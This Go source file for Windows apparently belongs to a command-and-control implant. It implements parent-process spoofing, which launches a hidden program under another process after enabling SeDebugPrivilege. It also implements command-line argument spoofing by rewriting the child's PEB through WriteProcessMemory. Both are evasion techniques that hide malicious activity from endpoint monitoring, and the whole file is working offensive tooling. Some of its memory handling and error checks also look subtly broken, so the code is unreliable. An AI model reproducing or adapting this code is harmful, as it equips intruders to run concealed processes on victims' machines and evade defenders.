//go:build windows

package packet

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"main/util"
	"strings"
	"syscall"
	"unsafe"
)

func Runu(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	pidBytes := make([]byte, 4)
	_, err := buf.Read(pidBytes)
	if err != nil {
		return nil, err
	}
	pid := binary.BigEndian.Uint32(pidBytes)
	arg, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	program, _ := syscall.UTF16PtrFromString(string(arg))

	err = enableSeDebugPrivilege()
	if err != nil && err.Error() != ("The operation completed successfully.") {
		return nil, err
	}

	ProcessHandle, err := windows.OpenProcess(
		windows.PROCESS_TERMINATE|windows.SYNCHRONIZE|windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_CREATE_PROCESS|windows.PROCESS_SUSPEND_RESUME|windows.PROCESS_DUP_HANDLE, // Security Access rights
		true, // Inherit Handles
		pid,  // Target Process ID
	)

	var (
		size                uint64
		startupInfoExtended STARTUPINFOEX
	)

	//size := uintptr(0)

	InitializeProcThreadAttributeList.Call(
		0,                              // Initial should be NULL
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory to reserve
	)
	if err != nil {
		return nil, err
	}

	fmt.Println(size)

	/*if size < 48 {
		return nil, errors.New("InitializeProcThreadAttributeList returned invalid size!")
	}*/

	startupInfoExtended.AttributeList = new(LPPROC_THREAD_ATTRIBUTE_LIST)

	initResult, _, err := InitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory that was written
	)

	if initResult == 0 {
		return nil, errors.New("InitializeProcThreadAttributeList failed: " + err.Error())
	}

	updateResult, _, err := UpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		0,                                       // Reserved, must be zero
		0x00020000,                              // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS constant
		uintptr(unsafe.Pointer(&ProcessHandle)), // Pointer to HANDLE of the target process
		unsafe.Sizeof(ProcessHandle),            // Size of the HANDLE
		0,                                       // Pointer to previous value, we can ignore it
		0,                                       // Pointer the size to previous value, we can ignore it
	)

	if updateResult == 0 {
		return nil, errors.New("UpdateProcThreadAttribute failed: " + err.Error())
	}

	// Set STARTUPINFO size to match the extended size
	startupInfoExtended.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoExtended))
	startupInfoExtended.StartupInfo.ShowWindow = windows.SW_HIDE

	var procInfo windows.ProcessInformation

	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_NO_WINDOW,
		nil,
		nil,
		(*windows.StartupInfo)(unsafe.Pointer(&startupInfoExtended)),
		&procInfo)
	if err != nil {
		return nil, errors.New("could not spawn " + string(arg) + " " + err.Error())
	}

	windows.CloseHandle(ProcessHandle)

	return []byte("success"), nil

}

func ArgueSpoof(pI windows.ProcessInformation, b []byte) error {
	var (
		pbi        windows.PROCESS_BASIC_INFORMATION
		pebLocal   windows.PEB
		parameters windows.RTL_USER_PROCESS_PARAMETERS
	)

	arg := string(b)

	// Retrieve information on PEB location in process
	err := windows.NtQueryInformationProcess(pI.Process, windows.ProcessBasicInformation, unsafe.Pointer(&pbi), uint32(unsafe.Sizeof(pbi)), nil)
	if err != nil {
		return err
	}

	// Read the PEB from the target process
	err = windows.ReadProcessMemory(pI.Process, uintptr(unsafe.Pointer(pbi.PebBaseAddress)), (*byte)(unsafe.Pointer(&pebLocal)), unsafe.Sizeof(windows.PEB{}), nil)
	if err != nil {
		return err
	}

	// Grab the ProcessParameters from PEB
	err = windows.ReadProcessMemory(pI.Process, uintptr(unsafe.Pointer(pebLocal.ProcessParameters)), (*byte)(unsafe.Pointer(&parameters)), unsafe.Sizeof(windows.RTL_USER_PROCESS_PARAMETERS{}), nil)
	if err != nil {
		return err
	}

	// Set the actual arguments we are looking to use

	arg16, _ := windows.UTF16PtrFromString(arg)
	err = windows.WriteProcessMemory(pI.Process, uintptr(unsafe.Pointer(parameters.CommandLine.Buffer)), (*byte)(unsafe.Pointer(arg16)), uintptr(len(arg)*2+1), nil)
	if err != nil {
		return err
	}

	args := strings.Split(arg, " ")
	newUnicodeLen := len(args[0]) * 2
	err = windows.WriteProcessMemory(pI.Process, uintptr(unsafe.Pointer(pebLocal.ProcessParameters))+unsafe.Offsetof(windows.RTL_USER_PROCESS_PARAMETERS{}.CommandLine), (*byte)(unsafe.Pointer(&newUnicodeLen)), 4, nil)
	if err != nil {
		return err
	}

	_, err = windows.ResumeThread(pI.Thread)
	if err != nil {
		return err
	}

	return nil
}
